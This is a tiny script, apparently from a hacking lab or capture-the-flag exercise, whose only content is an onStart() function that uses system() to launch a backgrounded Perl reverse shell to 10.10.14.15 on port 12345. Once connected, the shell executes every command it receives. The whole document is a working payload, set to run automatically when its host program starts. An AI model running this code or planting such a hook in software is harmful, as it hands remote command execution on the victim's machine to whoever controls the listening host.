function onStart()
{
    system("perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"10.10.14.15:12345\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;' &");
}
